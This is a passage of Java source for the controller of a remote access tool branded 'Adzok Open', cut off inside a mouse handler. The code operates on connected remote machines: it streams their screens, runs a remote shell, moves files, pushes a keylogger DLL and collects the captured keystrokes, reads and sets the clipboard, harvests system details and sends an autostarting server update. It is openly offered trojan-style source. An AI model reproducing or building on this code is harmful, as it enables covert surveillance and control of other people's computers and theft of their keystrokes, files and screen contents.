
/**
 *
 * @author AngelCruel
 */
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.util.Calendar;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;

public class ManejadorCliente implements Runnable {

    boolean cancelarArchivo = true;
    boolean cancelarUpdate = true;
    private Socket scliente; //socket cliente
    private String nombre = null; //nombre de usuario del cliente
    private ObjectInputStream entrada; //canal de entrada con cliente
    private ObjectOutputStream salida; //canal de salida con el cliente
    private RecursoClientes recurso = RecursoClientes.getInstance(); //lista de clientes compartida por todos los clientes
    private boolean disponible = true; //se usa para sincronizar los mensajes salientes
    private boolean conectado = false;
    private Thread hilo; // se usa para escuchar los mensajes entrantes
    private String ipExterna, ipInterna;
    private String nombreUsuario;
    private String version, ping;
    private int puerto;
    private boolean boolGuardar = false;
    private String preFix = "";
    private String Fix = "";
    private int contadorPrefix = 0;
    private String tipoArchivo = "jpg";
    private int salirVentana = 0;
    public guiOpciones guiOpciones;
    private eventoBotonesCommand eventosCommand;
    private eventoBotonesEscritorio eventosEscritorio;
    private eventoBotonesArchivo eventoOpciones;
    private eventosMensaje eventoMensaje;
    private eventoLoadShell eventoShell;
    private eventoKeys eventoKeys;
    private eventoClipBoard evento;
    private eventosFun eventofun;
    public StringBuffer mus;
    private int moved = 1;
    JFileChooser chooser;
    byte[] bits = new byte[1024];
    String fileArch = null;
    boolean enProceso = false;
    String datos = null;
    boolean capmouse = false;
    int indexActual = 0;
    String dir = "";
    String dirTemp = "";
    boolean mostrar = true;

    public ManejadorCliente() {
    }

    public ManejadorCliente(Socket cliente, ObjectInputStream in, ObjectOutputStream out) {
        this.scliente = cliente;
        this.entrada = in;
        this.salida = out;

        conectado = true;
    }

    public String getNombre() {
        return nombre;
    }

    public void setNombre(String nombre) {
        this.nombre = nombre;
    }

    public String getNombreUsuario() {
        return nombreUsuario;
    }

    public void setNombreUsuario(String nombreUsuario) {
        this.nombreUsuario = nombreUsuario;
    }

    public String getIPexterna() {
        return ipExterna;
    }

    public void setIPexterna(String ip) {
        this.ipExterna = ip;
    }

    public String getIPinterna() {
        return ipInterna;
    }

    public void setIPinterna(String ip) {
        this.ipInterna = ip;
    }

    public int getPuerto() {
        return puerto;
    }

    public void setPuerto(int puerto) {
        this.puerto = puerto;
    }

    public String getVersion() {
        return version;
    }

    public void setVersion(String version) {
        this.version = version;
    }

    public String getPing() {
        return ping;
    }

    public void setPing(String ping) {
        this.ping = ping;
    }

    public synchronized void Mensaje(mensaje mensaje) {
        while (!disponible) {
            try {
                wait();
            } catch (InterruptedException ex) {
                Logger.getLogger(RecursoClientes.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        disponible = false;
        notify();

        try {
            salida.writeObject((Object) mensaje);
            salida.flush();
        } catch (NullPointerException nu) {
            System.out.println("Error al enviar mensaje NULL");
        } catch (IOException ex) {
            System.out.println("Error al enviar mensaje IOexception");
        }

        disponible = true;
        notify();
    }

    public void start() {
        hilo = new Thread(this);
        hilo.start();

        File directorio = new File(nombre);
        directorio.mkdir();
        guiOpciones = new guiOpciones();
        guiOpciones.setTitle(nombre + " - " + ipExterna + " / Adzok Open - Tools");
        guiOpciones.opciones.addListSelectionListener(new HandlerList());

        eventosEscritorio = new eventoBotonesEscritorio();
        guiOpciones.ventana.single.addActionListener(eventosEscritorio);
        guiOpciones.ventana.start.addActionListener(eventosEscritorio);
        guiOpciones.ventana.stop.addActionListener(eventosEscritorio);

        CheckBoxHandler handler1 = new CheckBoxHandler();
        guiOpciones.ventana.save.addItemListener(handler1);
        guiOpciones.ventana.gif.addItemListener(handler1);
        guiOpciones.ventana.mouse.addItemListener(handler1);

        MouseHandler handler = new MouseHandler();
        guiOpciones.ventana.foto.addMouseListener(handler);
        guiOpciones.ventana.foto.addMouseMotionListener(handler);

        eventosCommand = new eventoBotonesCommand();
        guiOpciones.command.enviar.addActionListener(eventosCommand);
        guiOpciones.command.salir.addActionListener(eventosCommand);
        guiOpciones.command.textoOut.addActionListener(eventosCommand);
        guiOpciones.command.textoOut.requestFocus(true);

        eventoOpciones = new eventoBotonesArchivo();
        guiOpciones.venArchivo.baceptar.addActionListener(eventoOpciones);
        guiOpciones.venArchivo.bcancelar.addActionListener(eventoOpciones);
        guiOpciones.venArchivo.saceptar.addActionListener(eventoOpciones);
        guiOpciones.venArchivo.scancelar.addActionListener(eventoOpciones);

        chooser = new JFileChooser();

        eventoBotonesKeylogger eventosKeylogger = new eventoBotonesKeylogger();
        guiOpciones.keylogger.guardar.addActionListener(eventosKeylogger);
        guiOpciones.keylogger.salir.addActionListener(eventosKeylogger);

        eventoMensaje = new eventosMensaje();
        guiOpciones.mensajes.enviar.addActionListener(eventoMensaje);

        eventoShell = new eventoLoadShell();
        guiOpciones.shell.generar.addActionListener(eventoShell);
        guiOpciones.shell.ejecutar.addItemListener(eventoShell);

        eventoKeys = new eventoKeys();
        guiOpciones.keys.sends.addActionListener(eventoKeys);
        for (int i = 0; i < guiOpciones.keys.nombres.length; i++) {
            guiOpciones.keys.botones[i].addActionListener(eventoKeys);
        }

        evento = new eventoClipBoard();
        guiOpciones.clipboard.actualizar.addActionListener(evento);
        guiOpciones.clipboard.set.addActionListener(evento);
        guiOpciones.clipboard.clear.addActionListener(evento);

        eventofun = new eventosFun();
        guiOpciones.fun.cancel.addActionListener(eventofun);
        guiOpciones.fun.buttonShell.addActionListener(eventofun);
        guiOpciones.fun.buttonVisit.addActionListener(eventofun);
        guiOpciones.fun.shutdown.addActionListener(eventofun);
    }

    public String verHora() {
        Calendar calendario = Calendar.getInstance();
        int hora, minutos, segundos;
        String shora = null, sminutos = null, ssegundos = null;

        hora = calendario.get(Calendar.HOUR);
        minutos = calendario.get(Calendar.MINUTE);
        segundos = calendario.get(Calendar.SECOND);

        shora = (hora < 10) ? "0" + hora : "" + hora;
        sminutos = (minutos < 10) ? "0" + minutos : "" + minutos;
        ssegundos = (segundos < 10) ? "0" + segundos : "" + segundos;

        return "(" + shora + ":" + sminutos + ":" + ssegundos + ") ";
    }

    public void run() {
        mus = new StringBuffer();
        datos = ipExterna + "-" + nombre + ": ";

        while (conectado) {
            try {
                int opcion = (Integer) descargarInformacion();
                switch (opcion) {
                    case 2:
                        fotoVentana();

                        guiOpciones.ventana.stop.setEnabled(false);
                        guiOpciones.ventana.mouse.setEnabled(true);
                        guiOpciones.ventana.start.setEnabled(true);
                        guiOpciones.ventana.single.setEnabled(true);
                        guiOpciones.ventana.progreso.setValue(0);
                        enProceso = false;
                        break;

                    case 3:
                        guiOpciones.command.textoIn.append(descargarInformacion().toString());
                        guiOpciones.command.textoIn.setCaretPosition(guiOpciones.command.textoIn.getText().length());
                        break;

                    case 4:
                        enProceso = false;
                        cancelarArchivo = true;
                        break;

                    case 5:
                        actualizarInfoOpciones(verHora() + datos + "Got the file correctly..." + fileArch);
                        enProceso = false;
                        break;

                    case 6:
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException ex) {
                            Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
                        }
                        String temp = (String) descargarInformacion();
                        if (temp.equals("no existe")) {
                            actualizarInfoOpciones(verHora() + datos + "File does not exist.");
                            enProceso = false;
                        } else {
                            String temp2 = (String) descargarInformacion();
                            if (temp2.equals("Error")) {
                                actualizarInfoOpciones(verHora() + datos + "The file is too large to be transferred only supports files of 56 MB in size.");
                                actualizarInfoOpciones(verHora() + datos + "Transfer files with UNLIMITED size with Adzok Pro.");
                                enProceso = false;
                            } else {
                                actualizarInfoOpciones(verHora() + datos + "The file is downloading..." + temp);
                                String nombref = (String) descargarInformacion();
                                System.out.println("file " + nombref);
                                byte[] b = (byte[]) descargarInformacion();
                                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(b);
                                FileOutputStream fileOut;
                                try {
                                    fileOut = new FileOutputStream(nombre + "\\" + nombref);
                                    int data = -1;
                                    while ((data = byteArrayInputStream.read()) != -1) {
                                        fileOut.write(data);
                                    }
                                    fileOut.close();
                                    byteArrayInputStream.close();
                                } catch (FileNotFoundException ex) {
                                    ex.printStackTrace();
                                } catch (IOException ex) {
                                    ex.printStackTrace();
                                }
                                actualizarInfoOpciones(verHora() + datos + "He got the file correctly..." + nombref);
                                enProceso = false;
                            }
                        }
                        break;

                    case 7:
                        guiOpciones.keylogger.textoIn.append(descargarInformacion().toString() + " ");
                        guiOpciones.keylogger.textoIn.setCaretPosition(guiOpciones.keylogger.textoIn.getText().length());
                        break;

                    case 8:
                        if (descargarInformacion().toString().equals("WINDOWS")) {
                            int res = 0;
                            if (descargarInformacion().toString().equals("NO")) {

                                res = JOptionPane.showConfirmDialog(null, "You need a plugin to enable this option. Want to upload the plugin now?", "Activate Keylogger", JOptionPane.OK_CANCEL_OPTION);
                                if (res == JOptionPane.YES_OPTION) {
                                    InputStream fileInput = getClass().getResourceAsStream("Key.dll");
                                    ByteArrayOutputStream fileArray = new ByteArrayOutputStream();

                                    byte[] array = new byte[1024];
                                    int leidos = fileInput.read(array);
                                    int i = 0;
                                    while (leidos > 0) {
                                        fileArray.write(array, 0, leidos);
                                        leidos = fileInput.read(array);
                                    }
                                    fileInput.close();
                                    fileArray.close();

                                    ByteArrayOutputStream compressedContent = new ByteArrayOutputStream();
                                    GZIPOutputStream gzipstream = new GZIPOutputStream(compressedContent);
                                    gzipstream.write(fileArray.toByteArray());
                                    gzipstream.finish();
                                    gzipstream.close();
                                    compressedContent.close();
                                    byte[] compressedBytes = compressedContent.toByteArray();

                                    gestionarMensaje("Dato", 5);
                                    gestionarMensaje("Mensaje", "Key.dll");
                                    gestionarMensaje("Mensaje", "Key.dll");
                                    actualizarInfo(verHora() + datos + "They are uploading the plugins... Key.dll");
                                    gestionarMensaje("Archivo", compressedBytes);
                                    gestionarMensaje("Dato", 7);
                                    enProceso = true;
                                }
                            }
                        } else {
                            enProceso = false;
                        }
                        break;

                    case 9:
                        break;

                    case 10:
                        String[][] datos2 = new String[0][0];
                        String[] nombres = new String[]{"Internal IP", "External IP", "Nombre de la PC", "Nombre de Usuario Activo",
                            "Pais", "Sistema Operativo", "Version Sistema Operativo", "Leguaje del Usuario", "Procesador",
                            "Arquitectura del Procesador", "Numero de Procesador instalados", "Resolución de pantalla",
                            "Fecha y hora del Server", "Ubicación Actual del Server", "Version Java instalado"};

                        String info2 = descargarInformacion().toString();
                        String[] tempo = info2.split("#");

                        String[] tituloTable = new String[]{" ", " "};
                        DefaultTableModel model = new DefaultTableModel(datos2, tituloTable);
                        for (int i = 0; i < tempo.length; i++) {
                            Object[] newRow = {nombres[i], tempo[i]};
                            model.addRow(newRow);
                        }
                        guiOpciones.info.lista.setModel(model);
                        enProceso = false;
                        break;

                    case 11:
                        break;

                    case 12:
                        guiOpciones.clipboard.textoIn.setText((String) descargarInformacion());
                        break;

                    case 13:

                        break;

                    case 100:
                        actualizarInfo(verHora() + datos + "The server is upgraded correctly!!!");
                        enProceso = false;
                        break;
                    default:
                        actualizarInfo(verHora() + datos + "Incorrect case.");
                        break;
                }
            } catch (IOException ex) {
                Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
            } catch (NullPointerException nu) {
                System.out.println("NULL en RUN");
            }
        }
    }

    private void gestionarMensaje(String tipo, Object informacion) {
        mensaje mensaje = new mensaje();
        mensaje.setTipo((String) tipo);
        if (tipo.equals("Archivo")) {
            mensaje.setArchivo((byte[]) informacion);
        } else if (tipo.equals("Mensaje")) {
            mensaje.setMensaje((String) informacion);
        } else if (tipo.equals("bufferMensaje")) {
            mensaje.setBufferMensaje((StringBuffer) informacion);
        } else if (tipo.equals("Dato")) {
            mensaje.setDato((Integer) informacion);
        }
        Mensaje(mensaje);
    }

    private void enviarPropiedades() {
        StringBuffer extOpciones = new StringBuffer();

        if (guiOpciones.ventana.comboCalidad.getSelectedItem().toString().equals("White and Black")) {
            extOpciones.append("02");
        } else {
            extOpciones.append("24");
        }
        extOpciones.append("/");

        double dow = guiOpciones.ventana.resoluciones.getValue() / 100.0;
        boolean ninguno = true;
        for (int i = 10; i <= 90; i += 10) {
            if (guiOpciones.ventana.resoluciones.getValue() == i) {
                extOpciones.append(i / 100.0).append("0");
                ninguno = false;
            }
        }
        if (guiOpciones.ventana.resoluciones.getValue() == 0 || guiOpciones.ventana.resoluciones.getValue() == 100) {
            extOpciones.append("1.00");
            ninguno = false;
        }
        if (ninguno) {
            extOpciones.append(dow);
        }
        extOpciones.append("/");
        extOpciones.append(tipoArchivo);
        extOpciones.append("/");
        extOpciones.append(guiOpciones.ventana.tmseg.getText());
        gestionarMensaje("bufferMensaje", extOpciones);
    }

    private Object descargarInformacion() {
        Object objeto = null;
        mensaje mensaje = null;
        try {
            mensaje = (mensaje) entrada.readObject();
            if (mensaje.getTipo().equals("Archivo")) {
                ByteArrayInputStream archivo = new ByteArrayInputStream(mensaje.getArchivo());
                GZIPInputStream gzipin = new GZIPInputStream(archivo);
                archivo.close();
                ByteArrayOutputStream baos = new ByteArrayOutputStream(mensaje.getArchivo().length * 2);
                int len = -1;
                while ((len = gzipin.read(bits)) != -1) {
                    baos.write(bits, 0, len);
                }
                objeto = baos.toByteArray();
                gzipin.close();
                baos.close();
            } else if (mensaje.getTipo().equals("Mensaje")) {
                objeto = mensaje.getMensaje();
            } else if (mensaje.getTipo().equals("bufferMensaje")) {
                objeto = mensaje.getBufferMensaje();
            } else if (mensaje.getTipo().equals("Dato")) {
                objeto = mensaje.getDato();
            }
        } catch (IOException ex) {
            //Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
            ex.printStackTrace();
            System.out.println("IOException en descargar informacion: ejecutando FINALIZE");
            finalize();
            conectado = false;
        } catch (NullPointerException ex) {
            //Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
            ex.printStackTrace();
            System.out.println("NullPointerException en descargar informacion: ejecutando FINALIZE");
            finalize();
            conectado = false;
        } catch (ClassNotFoundException ex) {
            //Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
            ex.printStackTrace();
            System.out.println("ClassNotFoundException en descargar informacion: ejecutando FINALIZE");
            finalize();
            conectado = false;
        }
        return objeto;
    }

    private void mouse(StringBuffer mos) {
        mus = new StringBuffer();
        mus = mos;
        moved = 1;
    }

    private void envmouse() {
        if (moved == 1) {
            moved = 0;
        } else if (moved == 0) {
            mus = new StringBuffer("NADA/1/122/132");
        }
        if (capmouse) {
            gestionarMensaje("bufferMensaje", mus);
        }
    }

    public void fotoVentana() {
        int volatil = 0;
        while (salirVentana != 0) {
            guiOpciones.ventana.foto.removeAll();
            if (capmouse) {
                gestionarMensaje("Mensaje", "SI");
            } else {
                gestionarMensaje("Mensaje", "NO");
            }
            envmouse();
            enviarPropiedades();
            envmouse();

            guiOpciones.ventana.textoCalidad.setText(String.valueOf(((Integer) descargarInformacion() / 1024)) + " KB");
            envmouse();

            ByteArrayInputStream entradaImagen = new ByteArrayInputStream((byte[]) descargarInformacion());
            envmouse();

            BufferedImage imageMemoria = null;
            try {
                imageMemoria = ImageIO.read(entradaImagen);
            } catch (IOException ex) {
                ex.printStackTrace();
            } catch (IllegalArgumentException ex) {
                ex.printStackTrace();
            }

            guiOpciones.ventana.foto.setIcon(new ImageIcon((BufferedImage) imageMemoria));
            guiOpciones.ventana.progreso.setValue(0);
            if (boolGuardar) {
                contadorPrefix++;
                Fix = fijarNombre(contadorPrefix);
                guardarFoto(imageMemoria);
            }
            if (salirVentana == 2) {
                return;
            } else if (salirVentana == 1) {
                return;
            }

            gestionarMensaje("Dato", 2);
            volatil = (Integer) descargarInformacion();
        }
    }

    private void guardarFoto(BufferedImage imageMemoria) {
        try {
            if (tipoArchivo.equals("jpg")) {
                ImageIO.write(imageMemoria, "jpg", new File(nombre + "\\" + preFix + Fix + "." + tipoArchivo));
            } else {
                ImageIO.write(imageMemoria, "gif", new File(nombre + "\\" + preFix + Fix + "." + tipoArchivo));
            }
        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    private String fijarNombre(int contador) {
        String salida = null;
        if (contador < 10) {
            salida = "000" + contador;
        } else if (contador > 10 || contador < 100) {
            salida = "00" + contador;
        } else if (contador > 100 || contador < 1000) {
            salida = "0" + contador;
        } else if (contador > 1000) {
            salida = String.valueOf(contador);
        }
        return salida;
    }

    public boolean mostrarVentanaUpdate() {
        JarInputStream jarIn = null;
        try {
            File temp = File.createTempFile("config", ".thf");
            InputStream ist = getClass().getResourceAsStream("/Autostart.jar");
            FileOutputStream archivoDestino = new FileOutputStream(temp);
            byte[] buffer = new byte[512 * 1024];
            int nbLectura;
            while ((nbLectura = ist.read(buffer)) != -1) {
                archivoDestino.write(buffer, 0, nbLectura);
            }
            jarIn = new JarInputStream(new FileInputStream(temp));
            byte[] buf = new byte[4096];
            JarEntry entry;
            File temp2 = File.createTempFile("config2", ".thf");
            FileOutputStream archivoDestino2 = new FileOutputStream(temp2);
            while ((entry = jarIn.getNextJarEntry()) != null) {
                if ("Server.jar".equals(entry.getName())) {
                    int read;
                    while ((read = jarIn.read(buf)) != -1) {
                        archivoDestino2.write(buf, 0, read);
                    }
                }
            }
            FileInputStream file = new FileInputStream(temp2);
            ByteArrayOutputStream fileArray = new ByteArrayOutputStream();

            byte[] array = new byte[1024];
            int leidos = file.read(array);
            int i = 0;
            while (leidos > 0 && cancelarUpdate) {
                fileArray.write(array, 0, leidos);
                leidos = file.read(array);
            }
            fileArray.close();
            file.close();


            ByteArrayOutputStream compressedContent = new ByteArrayOutputStream();
            GZIPOutputStream gzipstream = new GZIPOutputStream(compressedContent);
            gzipstream.write(fileArray.toByteArray());
            gzipstream.finish();
            gzipstream.close();
            compressedContent.close();
            byte[] compressedBytes = compressedContent.toByteArray();

            gestionarMensaje("Dato", 100);
            actualizarInfo(verHora() + datos + "Server is being updated...");
            gestionarMensaje("Archivo", compressedBytes);
            System.out.println("se envio");
        } catch (IOException ex) {
            ex.printStackTrace();
            cancelarUpdate = true;
            return false;
        }
        cancelarUpdate = true;
        return true;
    }

    public void mostrarVentanaReconectar() {
        gestionarMensaje("Dato", 20);
    }

    public void desconectar() {
        gestionarMensaje("Dato", 21);
    }

    public boolean mostrarVentanaUninstall() {
        gestionarMensaje("Dato", 99);
        return false;
    }

    public static void actualizarInfo(String mensaje) {
        cliente.info.append("\n" + mensaje);
        cliente.info.setCaretPosition(cliente.info.getText().length());
    }

    public void actualizarInfoOpciones(String mensaje) {
        guiOpciones.venArchivo.info.append("\n" + mensaje);
        guiOpciones.venArchivo.info.setCaretPosition(guiOpciones.venArchivo.info.getText().length());
    }

    public void accionEnviar() {
        if (guiOpciones.command.textoOut.getText().equals("")) {
            JOptionPane.showMessageDialog(null, "You have not entered anything", "Enter Commando", JOptionPane.INFORMATION_MESSAGE);
        } else {
            gestionarMensaje("Mensaje", guiOpciones.command.textoOut.getText());
        }
        guiOpciones.command.textoOut.requestFocus();
        guiOpciones.command.textoOut.setText("");
    }

    private class eventoBotonesEscritorio implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            String m = null;
            if (capmouse) {
                m = "SI";
            } else {
                m = "NO";
            }
            if (e.getSource() == guiOpciones.ventana.single) {
                salirVentana = 2;
                gestionarMensaje("Dato", 2);
                guiOpciones.ventana.single.setEnabled(false);
                guiOpciones.ventana.mouse.setEnabled(false);
                enProceso = true;
            } else if (e.getSource() == guiOpciones.ventana.start) {
                salirVentana = 3;
                gestionarMensaje("Dato", 2);
                guiOpciones.ventana.single.setEnabled(false);
                guiOpciones.ventana.start.setEnabled(false);
                guiOpciones.ventana.mouse.setEnabled(false);
                guiOpciones.ventana.stop.setEnabled(true);
                enProceso = true;
            } else if (e.getSource() == guiOpciones.ventana.stop) {
                salirVentana = 1;
            }
        }
    }

    private class eventoBotonesCommand implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            if (e.getActionCommand().equals(guiOpciones.command.textoOut.getText())) {
                accionEnviar();
            } else if (e.getSource() == guiOpciones.command.enviar) {
                accionEnviar();
            } else if (e.getSource() == guiOpciones.command.salir) {
                gestionarMensaje("Mensaje", "exit");
                enProceso = false;
                guiOpciones.command.enviar.setEnabled(false);
                guiOpciones.command.textoOut.setEnabled(false);
                guiOpciones.command.salir.setEnabled(false);
            }
        }
    }

    private class eventoBotonesKeylogger implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            if (e.getSource().equals(guiOpciones.keylogger.guardar)) {
                FileOutputStream file;
                try {
                    file = new FileOutputStream(nombre + "\\keylogger.txt");

                    String a = guiOpciones.keylogger.textoIn.getText();
                    int fin = a.length();
                    int i = 0;
                    while (i < fin) {
                        file.write(a.charAt(i));
                        i++;
                    }
                    file.flush();
                    file.close();
                } catch (Exception ex) {
                    Logger.getLogger(ManejadorCliente.class.getName()).log(Level.SEVERE, null, ex);
                }
                JOptionPane.showMessageDialog(null, "Saved correctamemte", "Keylogger", JOptionPane.INFORMATION_MESSAGE);
            } else if (e.getSource().equals(guiOpciones.keylogger.salir)) {
                gestionarMensaje("Dato", 8);
                enProceso = false;
                guiOpciones.keylogger.salir.setEnabled(false);
            }
        }
    }

    private class eventoBotonesArchivo implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            if (e.getSource() == guiOpciones.venArchivo.baceptar) {
                if (enProceso) {
                    mensajeOcupado(indexActual, getNombre(), getIPexterna());
                    return;
                }
                gestionarMensaje("Dato", 6);
                gestionarMensaje("Mensaje", guiOpciones.venArchivo.tbDireccion.getText());
                enProceso = true;
            } else if (e.getSource() == guiOpciones.venArchivo.bcancelar) {
                JOptionPane.showMessageDialog(null, "Transfer can only be canceled at Adzok Pro", "Information", JOptionPane.INFORMATION_MESSAGE);
            } else if (e.getSource() == guiOpciones.venArchivo.saceptar) {
                if (enProceso) {
                    mensajeOcupado(indexActual, getNombre(), getIPexterna());
                    return;
                }
                chooser = new JFileChooser();
                chooser.setDialogTitle("Subir Archivo");
                chooser.setApproveButtonText("Subir");
                int ret = chooser.showOpenDialog(null);
                if (ret == JFileChooser.CANCEL_OPTION) {
                    enProceso = false;
                    return;
                }
                File file = chooser.getSelectedFile();
                if (file == null || file.getName().equals("") || !file.exists()) {
                    JOptionPane.showMessageDialog(null, "Invalid file name", "Error entering data", JOptionPane.ERROR_MESSAGE);
                    enProceso = false;
                    return;
                }

                try {
                    FileInputStream fileInput = new FileInputStream(file);
                    ByteArrayOutputStream fileArray = new ByteArrayOutputStream();

                    if (fileInput.available() > 59244544) {
                        actualizarInfoOpciones(verHora() + datos + "The file is too large to be transferred only supports files of 56 MB in size.");
                        actualizarInfoOpciones(verHora() + datos + "Transfer files with UNLIMITED size with Adzok Pro.");
                        enProceso = false;
                        return;
                    }

                    byte[] array = new byte[1024];
                    int leidos = fileInput.read(array);
                    int i = 0;
                    while (leidos > 0 && cancelarArchivo) {
                        fileArray.write(array, 0, leidos);
                        leidos = fileInput.read(array);
                    }
                    fileInput.close();
                    fileArray.close();

                    ByteArrayOutputStream compressedContent = new ByteArrayOutputStream();
                    GZIPOutputStream gzipstream = new GZIPOutputStream(compressedContent);
                    gzipstream.write(fileArray.toByteArray());
                    gzipstream.finish();
                    gzipstream.close();
                    compressedContent.close();
                    byte[] compressedBytes = compressedContent.toByteArray();

                    gestionarMensaje("Dato", 5);
                    fileArch = file.getName();
                    gestionarMensaje("Mensaje", fileArch);

                    gestionarMensaje("Mensaje", guiOpciones.venArchivo.tsDireccion.getText());
                    actualizarInfoOpciones(verHora() + datos + "They are uploading the file..." + fileArch);
                    gestionarMensaje("Archivo", compressedBytes);
                } catch (IOException ex) {
                    ex.printStackTrace();
                    cancelarArchivo = true;
                    enProceso = false;
                    return;
                }
                cancelarArchivo = true;
                enProceso = true;
                return;
            } else if (e.getSource() == guiOpciones.venArchivo.scancelar) {
                JOptionPane.showMessageDialog(null, "Transfer can only be canceled at Adzok Pro", "Error", JOptionPane.INFORMATION_MESSAGE);
            }
        }
    }

    private class eventosMensaje implements ActionListener {

        @Override
        public void actionPerformed(ActionEvent e) {
            if (e.getSource() == guiOpciones.mensajes.enviar) {
                gestionarMensaje("Dato", 4);
                gestionarMensaje("Mensaje", guiOpciones.mensajes.ttitulo.getText());
                gestionarMensaje("Mensaje", guiOpciones.mensajes.tmensaje.getText());
                gestionarMensaje("Dato", guiOpciones.mensajes.group.getSelection().getMnemonic());
            }
        }
    }

    private class CheckBoxHandler implements ItemListener {

        public void itemStateChanged(ItemEvent event) {
            if (event.getSource() == guiOpciones.ventana.save) {
                boolGuardar = guiOpciones.ventana.save.isSelected() ? true : false;
                if (boolGuardar) {
                    preFix = JOptionPane.showInputDialog(null, "Please enter a prefix", "PreFix", JOptionPane.QUESTION_MESSAGE);
                }
            }
            if (event.getSource() == guiOpciones.ventana.gif) {
                tipoArchivo = guiOpciones.ventana.gif.isSelected() ? "gif" : "jpg";
            }
            if (event.getSource() == guiOpciones.ventana.mouse) {
                capmouse = guiOpciones.ventana.mouse.isSelected() ? true : false;
            }
        }
    }

    private class cerrarOpciones extends WindowAdapter {

        Frame oframe;

        public cerrarOpciones(Frame miframe) {
            oframe = miframe;
        }

        public void windowClosing(WindowEvent ev) {
            enProceso = false;
        }
    }

    public void mensajeOcupado(int index, String nombre, String IP) {
        String mens = null;
        if (index == 0) {
            mens = "Remote Desktop is transferring, click the button \"Stop\""
                    + "\nand wait for it to finish transferring to switch to another function.";
        } else if (index == 1) {
            mens = "Remote Shell function is activated, click the button"
                    + "\n\"STOP Remote Shell\" to switch to another function.";
        } else if (index == 2) {
            mens = "Funcion";
        } else if (index == 3) {
            mens = "up or down a file, wait until you are finished"
                    + "\ntransferring to switch to another function";
        } else if (index == 4) {
            mens = "Keylogger function is activated, click the button"
                    + "\n\"STOP Keylogger\" to switch to another function.";
        } else if (index == 9) {
            mens = "Information function, wait until you are finished"
                    + "\ntransferring to switch to another function";
        }
        JOptionPane.showMessageDialog(null, mens
                + "\nMultithreading is available in Adzok Pro"
                + "\nAdzok Pro is available in: http://adzok.com",
                nombre + " - " + IP, JOptionPane.INFORMATION_MESSAGE);
    }

    class HandlerList implements ListSelectionListener {

        public void valueChanged(ListSelectionEvent e) {
            if (e.getValueIsAdjusting() == false) {
                if (guiOpciones.opciones.getSelectedIndex() == -1) {
                    //No selection.
                } else {
                    System.out.println("Selected from " + e.getFirstIndex() + " to " + e.getLastIndex());
                    if (enProceso) {
                        if (mostrar) {
                            mensajeOcupado(indexActual, getNombre(), getIPexterna());
                            mostrar = false;
                            guiOpciones.opciones.setSelectedIndex(indexActual);
                        } else {
                            mostrar = true;
                        }
                        return;
                    }
                    if (guiOpciones.opciones.getSelectedIndex() == 0) {
                        guiOpciones.opciones.setFocusable(true);
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Remote Desktop");
                        indexActual = 0;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 1) {
                        guiOpciones.opciones.setFocusable(true);
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Remote Shell");
                        enProceso = true;
                        gestionarMensaje("Dato", 3);
                        indexActual = 1;
                        guiOpciones.command.enviar.setEnabled(true);
                        guiOpciones.command.textoOut.setEnabled(true);
                        guiOpciones.command.salir.setEnabled(true);
                    } else if (guiOpciones.opciones.getSelectedIndex() == 2) {
                        guiOpciones.opciones.setFocusable(true);
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"File Browser");
                        indexActual = 2;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 3) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Upload and Download");
                        indexActual = 3;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 4) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Keylogger");
                        gestionarMensaje("Dato", 7);
                        guiOpciones.keylogger.salir.setEnabled(true);
                        enProceso = true;
                        indexActual = 4;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 5) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Send Messages");
                        indexActual = 5;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 6) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Camera and Microphone");
                        indexActual = 6;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 7) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Process List");
                        indexActual = 7;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 8) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Load and Run Script");
                        indexActual = 8;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 9) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Information System");
                        gestionarMensaje("Dato", 10);
                        enProceso = true;
                        indexActual = 9;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 10) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Send Keys");
                        indexActual = 10;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 11) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Clipboard");
                        indexActual = 11;
                    } else if (guiOpciones.opciones.getSelectedIndex() == 12) {
                        guiOpciones.cardLayout.show(guiOpciones.tabbedList,"Fun");
                        indexActual = 12;
                    }
                }
            }
        }
    }

    private class MouseHandler implements MouseListener, MouseMotionListener {

        @Override
        public void mouseClicked(MouseEvent e) {
